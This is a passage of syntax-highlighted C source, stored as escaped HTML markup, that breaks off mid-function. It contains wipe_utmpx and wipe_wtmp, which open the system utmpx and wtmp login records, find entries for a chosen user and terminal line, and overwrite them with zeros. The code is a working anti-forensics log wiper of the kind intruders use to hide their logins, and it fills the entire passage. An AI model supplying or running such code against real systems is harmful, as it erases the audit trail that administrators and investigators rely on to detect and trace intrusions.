&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt; */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#ifdef HAVE_UTMPX
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;wipe_utmpx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;who&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;line&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; 		&lt;span class=&#34;n&#34;&gt;fd1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;utmpx&lt;/span&gt;	&lt;span class=&#34;n&#34;&gt;utx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Patching %s .... &amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;UTMPX_FILE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;fflush&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stdout&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;cm&#34;&gt;/*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;	 * Open the utmp file and temporary file.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;	 */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;UTMPX_FILE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;O_RDWR&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;nf&#34;&gt;fprintf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stderr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;ERROR: Opening %s&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;UTMPX_FILE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;utx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;sizeof&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;utx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;strncmp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;utx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ut_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;who&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;strlen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;who&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;line&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;line&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			  &lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;strncmp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;utx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ut_line&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;line&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;strlen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;line&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;				&lt;span class=&#34;nf&#34;&gt;bzero&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;utx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;sizeof&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;utx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;				&lt;span class=&#34;nf&#34;&gt;lseek&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;sizeof&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;utx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SEEK_CUR&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;				&lt;span class=&#34;nf&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;utx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;sizeof&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;utx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Done.&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#endif
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;/*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt; * WTMP editing.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt; */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;wipe_wtmp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;who&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;line&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;		&lt;span class=&#34;n&#34;&gt;fd1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;utmp&lt;/span&gt;	&lt;span class=&#34;n&#34;&gt;ut&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Patching %s .... &amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;WTMP_FILE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;fflush&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stdout&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;cm&#34;&gt;/*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;	 * Open the wtmp file and temporary file.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;	 */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WTMP_FILE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;O_RDWR&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;nf&#34;&gt;fprintf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stderr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;ERROR: Opening %s&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;WTMP_FILE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;cm&#34;&gt;/*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;	 * Determine offset of last relevent entry.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;	 */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;lseek&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;long&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;sizeof&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ut&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SEEK_END&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;read&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ut&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;sizeof&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ut&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;strncmp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ut&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ut_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;who&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;strlen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;who&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;line&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;line&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			  &lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;strncmp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ut&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ut_line&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;line&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;strlen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;line&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			  	&lt;span class=&#34;nf&#34;&gt;bzero&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ut&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;sizeof&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ut&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;				&lt;span class=&#34;nf&#34;&gt;lseek&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;long&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;sizeof&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ut&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SEEK_CUR&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
